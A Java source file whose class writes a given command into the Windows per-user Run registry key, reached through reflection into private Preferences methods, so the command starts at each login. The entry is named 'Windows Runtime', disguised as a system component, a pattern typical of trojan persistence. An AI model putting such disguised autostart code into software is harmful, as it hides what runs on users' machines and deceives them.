
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;
import java.util.prefs.Preferences;

class WindowsStartupService extends StartupService {

    private Preferences preferences = Preferences.userRoot();
    private Map<String, Field> consts = new HashMap<String, Field>();
    private Method openKey;
    private Method closeKey;
    private Method winRegSetValueEx;

    protected WindowsStartupService() {
        loadRegistryData();
    }

    private void loadRegistryData() {
        try {
            Class<?> clz = preferences.getClass();
            for (Field field : clz.getDeclaredFields()) {
                int mod = field.getModifiers();
                if (Modifier.isStatic(mod) && Modifier.isPrivate(mod) && Modifier.isFinal(mod)) {
                    field.setAccessible(true);
                    consts.put(field.getName(), field);
                }
            }
            closeKey = clz.getDeclaredMethod("closeKey", int.class);
            closeKey.setAccessible(true);
            winRegSetValueEx = clz.getDeclaredMethod("WindowsRegSetValueEx", int.class, byte[].class, byte[].class);
            winRegSetValueEx.setAccessible(true);
            openKey = clz.getDeclaredMethod("openKey", int.class, byte[].class, int.class, int.class);
            openKey.setAccessible(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private byte[] convertToAsciz(String str) {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        for (char c : str.toCharArray()) {
            output.write((byte) c);
        }
        output.write(0);
        return output.toByteArray();
    }

    public void add(String toAdd) {
        try {
            Integer handle = (Integer) openKey.invoke(preferences, consts.get("HKEY_CURRENT_USER").getInt(null),
                    convertToAsciz("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                    consts.get("KEY_SET_VALUE").getInt(null),
                    consts.get("KEY_SET_VALUE").getInt(null));
            winRegSetValueEx.invoke(null, handle, convertToAsciz("Windows Runtime"), convertToAsciz(toAdd));
            closeKey.invoke(preferences, handle);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}